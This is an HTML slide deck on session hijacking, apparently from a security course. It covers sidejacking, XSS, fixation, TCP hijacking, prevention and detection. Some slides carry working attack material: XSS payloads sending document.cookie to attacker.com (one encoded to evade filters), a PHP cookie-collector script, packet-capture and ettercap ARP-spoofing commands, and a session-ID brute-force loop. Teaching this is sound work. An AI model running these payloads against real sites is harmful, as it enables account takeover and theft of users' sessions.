@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Session Hijacking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/theme/white.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/highlight/monokai.css">
+    <style>
+        .reveal h1, .reveal h2, .reveal h3 {
+            color: #2c3e50;
+        }
+        .reveal .slides section {
+            text-align: left;
+        }
+        .reveal .title-slide {
+            text-align: center;
+        }
+        .reveal .highlight {
+            background-color: #3498db;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+        }
+        .reveal .session-box {
+            background-color: #e8f5e8;
+            border-left: 4px solid #27ae60;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        .reveal .hijack-box {
+            background-color: #d1ecf1;
+            border-left: 4px solid #17a2b8;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        .reveal .attack-box {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        .reveal .defense-box {
+            background-color: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        .reveal .example-box {
+            background-color: #f8f9fa;
+            border: 2px solid #6c757d;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 0.85em;
+        }
+        .reveal img {
+            border: none !important;
+            box-shadow: none !important;
+        }
+        .reveal .comparison-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            font-size: 0.9em;
+        }
+        .reveal .attack-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 15px;
+            font-size: 0.85em;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+            <!-- Title Slide -->
+            <section class="title-slide">
+                <h1>Session Hijacking</h1>
+                <h3>Exploiting Session Management Vulnerabilities</h3>
+                <p>
+                    <small>Understanding Session Attacks and Authentication Bypass Techniques</small>
+                </p>
+                <div style="text-align: center; margin-top: 30px;">
+                    <img src="diagrams/session-hijacking-process.svg" alt="Session Hijacking Process" style="width: 70%; height: auto; max-width: 700px;">
+                </div>
+            </section>
+
+            <!-- Overview of Session Hijacking -->
+            <section>
+                <h2>Session Hijacking Overview</h2>
+                <div class="session-box">
+                    <strong>Session Hijacking:</strong> A security attack where an attacker steals or manipulates a user's session identifier to gain unauthorized access to their authenticated session and impersonate the legitimate user.
+                </div>
+                <h3>Key Components:</h3>
+                <ul>
+                    <li><strong>Session Management:</strong> How applications maintain user authentication state</li>
+                    <li><strong>Session Identifiers:</strong> Tokens that uniquely identify user sessions</li>
+                    <li><strong>Authentication Bypass:</strong> Circumventing login mechanisms</li>
+                    <li><strong>Identity Impersonation:</strong> Acting as the legitimate user</li>
+                    <li><strong>Privilege Exploitation:</strong> Using hijacked session privileges</li>
+                    <li><strong>Data Access:</strong> Unauthorized access to user data and functions</li>
+                </ul>
+                <div class="hijack-box">
+                    <strong>Impact:</strong> Session hijacking can lead to complete account takeover, data theft, financial fraud, and unauthorized system access
+                </div>
+            </section>
+
+            <!-- Session Management Fundamentals -->
+            <section>
+                <h2>Session Management Fundamentals</h2>
+                <div class="session-box">
+                    <strong>Session Lifecycle:</strong> Web applications use sessions to maintain user authentication and state across multiple HTTP requests.
+                </div>
+                <div class="comparison-grid">
+                    <div class="session-box">
+                        <h4>Session Components:</h4>
+                        <ul>
+                            <li><strong>Session ID:</strong> Unique identifier for each session</li>
+                            <li><strong>Session Data:</strong> User information and application state</li>
+                            <li><strong>Session Storage:</strong> Server-side or client-side storage</li>
+                            <li><strong>Session Timeout:</strong> Automatic session expiration</li>
+                            <li><strong>Session Cookies:</strong> Client-side session identifiers</li>
+                            <li><strong>Session Validation:</strong> Server-side session verification</li>
+                        </ul>
+                    </div>
+                    <div class="hijack-box">
+                        <h4>Session Flow:</h4>
+                        <ul>
+                            <li><strong>Authentication:</strong> User provides credentials</li>
+                            <li><strong>Session Creation:</strong> Server generates unique session ID</li>
+                            <li><strong>Session Binding:</strong> Session ID sent to client (cookie/URL)</li>
+                            <li><strong>Session Usage:</strong> Client includes session ID in requests</li>
+                            <li><strong>Session Validation:</strong> Server verifies session validity</li>
+                            <li><strong>Session Termination:</strong> Logout or timeout expires session</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="example-box">
+                    <strong>Session Cookie Example:</strong><br><br>
+                    
+                    <strong>HTTP Response (Login Success):</strong><br>
+                    Set-Cookie: JSESSIONID=A1B2C3D4E5F6G7H8I9J0; Path=/; HttpOnly; Secure<br>
+                    Set-Cookie: session_token=abc123def456ghi789; Domain=.example.com; SameSite=Strict<br><br>
+                    
+                    <strong>Subsequent HTTP Request:</strong><br>
+                    Cookie: JSESSIONID=A1B2C3D4E5F6G7H8I9J0; session_token=abc123def456ghi789<br><br>
+                    
+                    <strong>Session Data (Server-side):</strong><br>
+                    {<br>
+                    &nbsp;&nbsp;"session_id": "A1B2C3D4E5F6G7H8I9J0",<br>
+                    &nbsp;&nbsp;"user_id": 12345,<br>
+                    &nbsp;&nbsp;"username": "john.doe",<br>
+                    &nbsp;&nbsp;"role": "user",<br>
+                    &nbsp;&nbsp;"last_activity": 1640995200,<br>
+                    &nbsp;&nbsp;"expires": 1641001200<br>
+                    }
+                </div>
+            </section>
+
+            <!-- Types of Session Hijacking -->
+            <section>
+                <h2>Types of Session Hijacking Attacks</h2>
+                <div class="attack-grid">
+                    <div class="attack-box">
+                        <h4>Session Sidejacking:</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Packet sniffing to capture cookies</li>
+                            <li><strong>Target:</strong> Unencrypted HTTP traffic</li>
+                            <li><strong>Tools:</strong> Wireshark, Firesheep, DroidSheep</li>
+                            <li><strong>Vulnerability:</strong> Lack of HTTPS encryption</li>
+                            <li><strong>Prevention:</strong> Always use HTTPS/TLS</li>
+                        </ul>
+                    </div>
+                    <div class="hijack-box">
+                        <h4>Cross-Site Scripting (XSS):</h4>
+                        <ul>
+                            <li><strong>Method:</strong> JavaScript to steal cookies</li>
+                            <li><strong>Target:</strong> Web applications with XSS vulnerabilities</li>
+                            <li><strong>Payload:</strong> document.cookie theft</li>
+                            <li><strong>Vulnerability:</strong> Input validation failures</li>
+                            <li><strong>Prevention:</strong> XSS protection and HttpOnly cookies</li>
+                        </ul>
+                    </div>
+                    <div class="session-box">
+                        <h4>Session Fixation:</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Force victim to use predetermined session ID</li>
+                            <li><strong>Target:</strong> Applications not regenerating session IDs</li>
+                            <li><strong>Technique:</strong> URL manipulation or cookie injection</li>
+                            <li><strong>Vulnerability:</strong> Static session identifiers</li>
+                            <li><strong>Prevention:</strong> Session ID regeneration on login</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="comparison-grid">
+                    <div class="attack-box">
+                        <h4>Man-in-the-Middle (MITM):</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Intercept and modify communication</li>
+                            <li><strong>Target:</strong> Insecure network connections</li>
+                            <li><strong>Techniques:</strong> ARP spoofing, rogue access points</li>
+                            <li><strong>Capability:</strong> Real-time session manipulation</li>
+                            <li><strong>Prevention:</strong> Certificate pinning, HTTPS enforcement</li>
+                        </ul>
+                    </div>
+                    <div class="hijack-box">
+                        <h4>Brute Force/Prediction:</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Guess or calculate valid session IDs</li>
+                            <li><strong>Target:</strong> Weak session ID generation algorithms</li>
+                            <li><strong>Techniques:</strong> Sequential IDs, timestamp-based IDs</li>
+                            <li><strong>Tools:</strong> Custom scripts, Burp Suite</li>
+                            <li><strong>Prevention:</strong> Cryptographically strong random IDs</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Session Sidejacking Attack -->
+            <section>
+                <h2>Session Sidejacking Attack Demonstration</h2>
+                <div class="attack-box">
+                    <strong>Sidejacking:</strong> The most common form of session hijacking, exploiting unencrypted HTTP traffic to steal authentication cookies.
+                </div>
+                <div class="example-box">
+                    <strong>Session Sidejacking Attack Steps:</strong><br><br>
+                    
+                    <strong># 1. Set up packet capture</strong><br>
+                    sudo tcpdump -i wlan0 -s 0 -w cookies.pcap 'tcp port 80'<br>
+                    wireshark -i wlan0 -f "tcp port 80"<br><br>
+                    
+                    <strong># 2. Capture HTTP traffic containing cookies</strong><br>
+                    # Wait for victim to browse HTTP sites after HTTPS login<br>
+                    # Many sites use HTTPS for login but HTTP for regular browsing<br><br>
+                    
+                    <strong># 3. Extract cookies from captured packets</strong><br>
+                    tshark -r cookies.pcap -Y "http.cookie" -T fields -e http.cookie<br>
+                    tshark -r cookies.pcap -Y "http" -T fields -e http.host -e http.cookie<br><br>
+                    
+                    <strong># 4. Use Firesheep (Firefox extension - deprecated)</strong><br>
+                    # Automated cookie capture and session hijacking<br>
+                    # Shows logged-in users on same network<br><br>
+                    
+                    <strong># 5. Manual cookie injection</strong><br>
+                    # Copy captured cookie values<br>
+                    # Use browser developer tools or extensions<br>
+                    # Replace own cookies with victim's cookies<br>
+                    # Access victim's authenticated session<br><br>
+                    
+                    <strong>Example Captured Cookie:</strong><br>
+                    Host: facebook.com<br>
+                    Cookie: c_user=123456789; xs=1%3A1234567890%3A2%3A1234567890; datr=abc123
+                </div>
+            </section>
+
+            <!-- Cross-Site Scripting Session Theft -->
+            <section>
+                <h2>XSS-Based Session Hijacking</h2>
+                <div class="hijack-box">
+                    <strong>XSS Cookie Theft:</strong> Using Cross-Site Scripting vulnerabilities to execute JavaScript code that steals session cookies and sends them to attacker-controlled servers.
+                </div>
+                <div class="example-box">
+                    <strong>XSS Session Theft Payloads:</strong><br><br>
+                    
+                    <strong># Basic cookie theft</strong><br>
+                    &lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;<br><br>
+                    
+                    <strong># Image-based exfiltration</strong><br>
+                    &lt;script&gt;new Image().src='http://attacker.com/log.php?c='+document.cookie&lt;/script&gt;<br><br>
+                    
+                    <strong># AJAX-based theft</strong><br>
+                    &lt;script&gt;<br>
+                    var xhr = new XMLHttpRequest();<br>
+                    xhr.open('POST', 'http://attacker.com/collect.php', true);<br>
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');<br>
+                    xhr.send('cookies=' + encodeURIComponent(document.cookie));<br>
+                    &lt;/script&gt;<br><br>
+                    
+                    <strong># Encoded payload to bypass filters</strong><br>
+                    &lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,115,116,101,97,108,46,112,104,112,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))&lt;/script&gt;<br><br>
+                    
+                    <strong># Server-side collection script (steal.php)</strong><br>
+                    &lt;?php<br>
+                    $cookie = $_GET['cookie'];<br>
+                    $ip = $_SERVER['REMOTE_ADDR'];<br>
+                    $timestamp = date('Y-m-d H:i:s');<br>
+                    file_put_contents('stolen_cookies.txt', "$timestamp - $ip - $cookie\n", FILE_APPEND);<br>
+                    ?&gt;
+                </div>
+            </section>
+
+            <!-- Session Fixation Attacks -->
+            <section>
+                <h2>Session Fixation Attack Techniques</h2>
+                <div class="session-box">
+                    <strong>Session Fixation:</strong> An attack where the attacker fixes the user's session ID to a known value, then waits for the user to authenticate, gaining access to their authenticated session.
+                </div>
+                <div class="comparison-grid">
+                    <div class="attack-box">
+                        <h4>URL-based Fixation:</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Send victim malicious URL with session ID</li>
+                            <li><strong>Example:</strong> http://bank.com/login?JSESSIONID=A1B2C3</li>
+                            <li><strong>Process:</strong> Victim logs in using fixed session ID</li>
+                            <li><strong>Result:</strong> Attacker knows the authenticated session ID</li>
+                            <li><strong>Mitigation:</strong> Ignore URL-based session IDs</li>
+                        </ul>
+                    </div>
+                    <div class="hijack-box">
+                        <h4>Cookie-based Fixation:</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Inject session cookie via XSS or MITM</li>
+                            <li><strong>Vector:</strong> document.cookie = "SESSIONID=FIXED"</li>
+                            <li><strong>Requirement:</strong> Same-origin or subdomain access</li>
+                            <li><strong>Process:</strong> Pre-set cookie before user login</li>
+                            <li><strong>Mitigation:</strong> Regenerate session ID after login</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="example-box">
+                    <strong>Session Fixation Attack Example:</strong><br><br>
+                    
+                    <strong>Step 1: Attacker obtains session ID from target site</strong><br>
+                    GET /login.php HTTP/1.1<br>
+                    Host: bank.com<br><br>
+                    Response: Set-Cookie: SESSIONID=ABC123; Path=/<br><br>
+                    
+                    <strong>Step 2: Attacker sends victim malicious link</strong><br>
+                    http://bank.com/login.php?SESSIONID=ABC123<br>
+                    or via XSS: document.cookie="SESSIONID=ABC123; path=/"<br><br>
+                    
+                    <strong>Step 3: Victim logs in with fixed session ID</strong><br>
+                    POST /login.php HTTP/1.1<br>
+                    Cookie: SESSIONID=ABC123<br>
+                    username=victim&password=secret<br><br>
+                    
+                    <strong>Step 4: Attacker uses known session ID</strong><br>
+                    GET /account.php HTTP/1.1<br>
+                    Cookie: SESSIONID=ABC123<br>
+                    # Now authenticated as victim
+                </div>
+            </section>
+
+            <!-- Network-Based Session Hijacking -->
+            <section>
+                <h2>Network-Based Session Hijacking</h2>
+                <div class="attack-box">
+                    <strong>Network Attacks:</strong> Techniques that exploit network vulnerabilities to intercept or manipulate session traffic in transit.
+                </div>
+                <div class="attack-grid">
+                    <div class="attack-box">
+                        <h4>TCP Hijacking:</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Take over TCP connection</li>
+                            <li><strong>Technique:</strong> Sequence number prediction</li>
+                            <li><strong>Process:</strong> Desynchronize legitimate connection</li>
+                            <li><strong>Control:</strong> Complete session takeover</li>
+                            <li><strong>Difficulty:</strong> High technical complexity</li>
+                        </ul>
+                    </div>
+                    <div class="hijack-box">
+                        <h4>WiFi Session Hijacking:</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Wireless traffic interception</li>
+                            <li><strong>Target:</strong> Open or weakly encrypted WiFi</li>
+                            <li><strong>Tools:</strong> Wireshark, Ettercap, Firesheep</li>
+                            <li><strong>Vulnerability:</strong> Shared network medium</li>
+                            <li><strong>Scope:</strong> All wireless network users</li>
+                        </ul>
+                    </div>
+                    <div class="session-box">
+                        <h4>DNS Hijacking:</h4>
+                        <ul>
+                            <li><strong>Method:</strong> Redirect traffic to malicious sites</li>
+                            <li><strong>Technique:</strong> DNS spoofing, cache poisoning</li>
+                            <li><strong>Goal:</strong> Capture credentials and sessions</li>
+                            <li><strong>Impact:</strong> Complete session interception</li>
+                            <li><strong>Detection:</strong> SSL certificate warnings</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="example-box">
+                    <strong>TCP Sequence Prediction Attack:</strong><br><br>
+                    
+                    <strong># 1. Monitor target connection</strong><br>
+                    tcpdump -i eth0 host victim.com and port 80<br><br>
+                    
+                    <strong># 2. Analyze sequence numbers</strong><br>
+                    # Look for patterns in TCP sequence number generation<br>
+                    # Calculate next expected sequence number<br><br>
+                    
+                    <strong># 3. Inject packets with predicted sequence</strong><br>
+                    # Send RST to legitimate client (desync)<br>
+                    # Continue session with server using predicted sequence<br><br>
+                    
+                    <strong># 4. Tools for TCP hijacking</strong><br>
+                    hunt  # Network hijacking tool<br>
+                    ettercap -T -M arp /target_ip// /gateway_ip//<br>
+                    # Use built-in TCP hijacking features
+                </div>
+            </section>
+
+            <!-- Session Prediction and Brute Force -->
+            <section>
+                <h2>Session ID Prediction and Brute Force</h2>
+                <div class="hijack-box">
+                    <strong>Weak Session IDs:</strong> Applications that generate predictable or weak session identifiers are vulnerable to session prediction and brute force attacks.
+                </div>
+                <div class="comparison-grid">
+                    <div class="attack-box">
+                        <h4>Predictable Patterns:</h4>
+                        <ul>
+                            <li><strong>Sequential IDs:</strong> Incremental session identifiers</li>
+                            <li><strong>Timestamp-based:</strong> Time-derived session IDs</li>
+                            <li><strong>User-based:</strong> Username or user ID incorporated</li>
+                            <li><strong>Algorithmic:</strong> Simple mathematical formulas</li>
+                            <li><strong>Short Length:</strong> Insufficient entropy/randomness</li>
+                        </ul>
+                    </div>
+                    <div class="session-box">
+                        <h4>Attack Techniques:</h4>
+                        <ul>
+                            <li><strong>Pattern Analysis:</strong> Identify generation algorithm</li>
+                            <li><strong>Statistical Analysis:</strong> Find correlations and trends</li>
+                            <li><strong>Brute Force:</strong> Systematic ID enumeration</li>
+                            <li><strong>Rainbow Tables:</strong> Pre-computed session ID lists</li>
+                            <li><strong>Timing Attacks:</strong> Exploit time-based generation</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="example-box">
+                    <strong>Session ID Analysis and Attack:</strong><br><br>
+                    
+                    <strong># Weak session ID examples</strong><br>
+                    SESSIONID=12345678  # Sequential<br>
+                    SESSIONID=20220101001234  # Timestamp + counter<br>
+                    SESSIONID=user123_20220101  # Username + date<br>
+                    SESSIONID=ABC123  # Short, limited charset<br><br>
+                    
+                    <strong># Session ID analysis script</strong><br>
+                    #!/usr/bin/python3<br>
+                    import requests<br>
+                    import re<br><br>
+                    
+                    def analyze_session_ids():<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;sessions = []<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;for i in range(100):<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get('http://target.com/login')<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie = r.cookies.get('SESSIONID')<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sessions.append(cookie)<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Session {i}: {cookie}")<br><br>
+                    
+                    <strong># Brute force valid session IDs</strong><br>
+                    for i in range(1000000, 1001000):<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;cookies = {'SESSIONID': str(i)}<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;r = requests.get('http://target.com/profile', cookies=cookies)<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;if "Welcome" in r.text:<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Valid session found: {i}")
+                </div>
+            </section>
+
+            <!-- Session Hijacking Tools -->
+            <section>
+                <h2>Session Hijacking Tools and Frameworks</h2>
+                <div class="attack-grid">
+                    <div class="attack-box">
+                        <h4>Network Sniffing Tools:</h4>
+                        <ul>
+                            <li><strong>Wireshark:</strong> Packet capture and analysis</li>
+                            <li><strong>Ettercap:</strong> Comprehensive network attack suite</li>
+                            <li><strong>Bettercap:</strong> Modern network attack framework</li>
+                            <li><strong>dSniff:</strong> Network auditing and penetration testing</li>
+                            <li><strong>Tcpdump:</strong> Command-line packet analyzer</li>
+                        </ul>
+                    </div>
+                    <div class="hijack-box">
+                        <h4>Web Application Tools:</h4>
+                        <ul>
+                            <li><strong>Burp Suite:</strong> Web application security testing</li>
+                            <li><strong>OWASP ZAP:</strong> Web application scanner</li>
+                            <li><strong>Cookie Cadger:</strong> Automated cookie capture</li>
+                            <li><strong>Hamster & Ferret:</strong> Session sidejacking</li>
+                            <li><strong>WebSploit:</strong> Web application exploitation</li>
+                        </ul>
+                    </div>
+                    <div class="session-box">
+                        <h4>Specialized Tools:</h4>
+                        <ul>
+                            <li><strong>Firesheep:</strong> Firefox extension for sidejacking</li>
+                            <li><strong>DroidSheep:</strong> Android session hijacking</li>
+                            <li><strong>Hunt:</strong> TCP connection hijacking</li>
+                            <li><strong>T50:</strong> Network packet injector</li>
+                            <li><strong>Session Replay:</strong> Automated session reuse</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="example-box">
+                    <strong>Burp Suite Session Hijacking:</strong><br><br>
+                    
+                    <strong># 1. Configure Burp proxy</strong><br>
+                    # Set browser to use Burp as proxy (127.0.0.1:8080)<br>
+                    # Import Burp CA certificate<br><br>
+                    
+                    <strong># 2. Intercept authentication</strong><br>
+                    # Capture login request and response<br>
+                    # Note session cookie values<br><br>
+                    
+                    <strong># 3. Analyze session management</strong><br>
+                    # Check session ID entropy and predictability<br>
+                    # Test session fixation vulnerabilities<br>
+                    # Verify session timeout behavior<br><br>
+                    
+                    <strong># 4. Perform session attacks</strong><br>
+                    # Session fixation testing<br>
+                    # Cookie manipulation and replay<br>
+                    # Cross-site request forgery (CSRF) testing<br><br>
+                    
+                    <strong># 5. Automated scanning</strong><br>
+                    # Use Burp Scanner for session management issues<br>
+                    # Generate comprehensive vulnerability reports
+                </div>
+            </section>
+
+            <!-- Session Hijacking Prevention -->
+            <section>
+                <h2>Session Hijacking Prevention Techniques</h2>
+                <div class="defense-box">
+                    <strong>Defense Strategy:</strong> Multi-layered approach combining secure session management, encryption, and monitoring to prevent session hijacking attacks.
+                </div>
+                <div class="attack-grid">
+                    <div class="session-box">
+                        <h4>Secure Session Management:</h4>
+                        <ul>
+                            <li><strong>Strong Session IDs:</strong> Cryptographically random identifiers</li>
+                            <li><strong>Session Regeneration:</strong> New ID after authentication</li>
+                            <li><strong>Session Timeout:</strong> Automatic expiration policies</li>
+                            <li><strong>Session Binding:</strong> IP address and user agent validation</li>
+                            <li><strong>Concurrent Session Limits:</strong> Prevent multiple active sessions</li>
+                        </ul>
+                    </div>
+                    <div class="defense-box">
+                        <h4>Cookie Security:</h4>
+                        <ul>
+                            <li><strong>HttpOnly Flag:</strong> Prevent JavaScript access</li>
+                            <li><strong>Secure Flag:</strong> HTTPS-only transmission</li>
+                            <li><strong>SameSite Attribute:</strong> Cross-site request protection</li>
+                            <li><strong>Path Restriction:</strong> Limit cookie scope</li>
+                            <li><strong>Domain Restriction:</strong> Prevent subdomain access</li>
+                        </ul>
+                    </div>
+                    <div class="hijack-box">
+                        <h4>Network Security:</h4>
+                        <ul>
+                            <li><strong>HTTPS Enforcement:</strong> Encrypt all communications</li>
+                            <li><strong>HSTS Headers:</strong> Force HTTPS usage</li>
+                            <li><strong>Certificate Pinning:</strong> Prevent MITM attacks</li>
+                            <li><strong>VPN Usage:</strong> Secure network tunnels</li>
+                            <li><strong>Network Monitoring:</strong> Detect suspicious activity</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="example-box">
+                    <strong>Secure Session Implementation:</strong><br><br>
+                    
+                    <strong># PHP session security configuration</strong><br>
+                    ini_set('session.cookie_httponly', 1);<br>
+                    ini_set('session.cookie_secure', 1);<br>
+                    ini_set('session.use_strict_mode', 1);<br>
+                    session_regenerate_id(true);  // After login<br><br>
+                    
+                    <strong># Secure cookie headers</strong><br>
+                    Set-Cookie: SESSIONID=abc123; Path=/; Secure; HttpOnly; SameSite=Strict<br><br>
+                    
+                    <strong># Session validation</strong><br>
+                    if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;session_destroy();<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;header('Location: /login.php');<br>
+                    }<br><br>
+                    
+                    <strong># HTTPS enforcement</strong><br>
+                    if (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] !== 'on') {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;header('Location: https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);<br>
+                    }
+                </div>
+            </section>
+
+            <!-- Detection and Monitoring -->
+            <section>
+                <h2>Session Hijacking Detection and Monitoring</h2>
+                <div class="hijack-box">
+                    <strong>Detection Strategy:</strong> Implement comprehensive monitoring and anomaly detection to identify potential session hijacking attempts.
+                </div>
+                <div class="comparison-grid">
+                    <div class="attack-box">
+                        <h4>Behavioral Monitoring:</h4>
+                        <ul>
+                            <li><strong>IP Address Changes:</strong> Sudden location changes</li>
+                            <li><strong>User Agent Switching:</strong> Different browsers/devices</li>
+                            <li><strong>Activity Patterns:</strong> Unusual user behavior</li>
+                            <li><strong>Concurrent Sessions:</strong> Multiple active sessions</li>
+                            <li><strong>Access Timing:</strong> Abnormal login times</li>
+                            <li><strong>Geographic Anomalies:</strong> Impossible travel patterns</li>
+                        </ul>
+                    </div>
+                    <div class="defense-box">
+                        <h4>Technical Detection:</h4>
+                        <ul>
+                            <li><strong>Session Fingerprinting:</strong> Browser and system attributes</li>
+                            <li><strong>Token Validation:</strong> CSRF token verification</li>
+                            <li><strong>Request Analysis:</strong> Suspicious request patterns</li>
+                            <li><strong>Cookie Inspection:</strong> Cookie tampering detection</li>
+                            <li><strong>Network Monitoring:</strong> Traffic pattern analysis</li>
+                            <li><strong>Log Correlation:</strong> Multi-source log analysis</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="example-box">
+                    <strong>Session Monitoring Implementation:</strong><br><br>
+                    
+                    <strong># Session fingerprinting</strong><br>
+                    $fingerprint = hash('sha256', $_SERVER['HTTP_USER_AGENT'] . $_SERVER['HTTP_ACCEPT_LANGUAGE']);<br>
+                    if ($_SESSION['fingerprint'] !== $fingerprint) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;// Potential session hijacking<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;log_security_event('Session fingerprint mismatch', $user_id);<br>
+                    }<br><br>
+                    
+                    <strong># Geographic validation</strong><br>
+                    $current_country = geoip_country_code($_SERVER['REMOTE_ADDR']);<br>
+                    if ($_SESSION['country'] !== $current_country) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;// Geographic anomaly detected<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;require_additional_authentication();<br>
+                    }<br><br>
+                    
+                    <strong># Concurrent session detection</strong><br>
+                    SELECT COUNT(*) FROM active_sessions WHERE user_id = ?<br>
+                    if (count > 1) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;// Multiple active sessions detected<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;alert_user_and_admin();<br>
+                    }
+                </div>
+            </section>
+
+            <!-- Incident Response -->
+            <section>
+                <h2>Session Hijacking Incident Response</h2>
+                <div class="defense-box">
+                    <strong>Response Framework:</strong> Systematic approach to handling suspected or confirmed session hijacking incidents.
+                </div>
+                <div class="example-box">
+                    <strong>Session Hijacking Response Process:</strong><br><br>
+                    
+                    <strong>1. Detection and Alert:</strong><br>
+                    • Automated monitoring system alerts<br>
+                    • User-reported suspicious activity<br>
+                    • Anomaly detection triggers<br>
+                    • Security team investigation initiation<br><br>
+                    
+                    <strong>2. Immediate Containment:</strong><br>
+                    • Terminate all user sessions immediately<br>
+                    • Disable affected user accounts<br>
+                    • Block suspicious IP addresses<br>
+                    • Preserve logs and evidence<br><br>
+                    
+                    <strong>3. Investigation and Analysis:</strong><br>
+                    • Analyze session logs and access patterns<br>
+                    • Review network traffic captures<br>
+                    • Identify attack vector and timeline<br>
+                    • Assess data exposure and impact<br><br>
+                    
+                    <strong>4. Recovery and Remediation:</strong><br>
+                    • Reset user passwords and credentials<br>
+                    • Regenerate all session identifiers<br>
+                    • Patch identified vulnerabilities<br>
+                    • Strengthen session security controls<br><br>
+                    
+                    <strong>5. Communication and Follow-up:</strong><br>
+                    • Notify affected users<br>
+                    • Report to relevant authorities if required<br>
+                    • Document lessons learned<br>
+                    • Update security policies and procedures
+                </div>
+            </section>
+
+            <!-- Key Takeaways -->
+            <section>
+                <h2>Key Takeaways</h2>
+                <ul>
+                    <li>Session hijacking exploits weak session management to impersonate legitimate users</li>
+                    <li>Common attack vectors include packet sniffing, XSS, session fixation, and MITM</li>
+                    <li>HTTPS encryption is essential but not sufficient for complete session security</li>
+                    <li>Secure cookie attributes (HttpOnly, Secure, SameSite) provide critical protection</li>
+                    <li>Session ID generation must use cryptographically strong random values</li>
+                    <li>Behavioral monitoring and anomaly detection help identify hijacking attempts</li>
+                    <li>Incident response procedures must include immediate session termination</li>
+                    <li>Multi-layered defense combining technical controls and monitoring is most effective</li>
+                </ul>
+                <div class="session-box">
+                    <strong>Remember:</strong> Session security is fundamental to web application security - implement comprehensive session management controls and continuous monitoring to protect against hijacking attacks
+                </div>
+            </section>
+
+            <!-- Thank You -->
+            <section class="title-slide">
+                <h1>Thank You</h1>
+                <h3>Questions & Discussion</h3>
+                <p>Next: Introduction to Cyber Crime</p>
+            </section>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/notes/notes.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/markdown/markdown.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/highlight/highlight.min.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            transition: 'slide',
+            plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
+        });
+    </script>
+</body>
+</html>
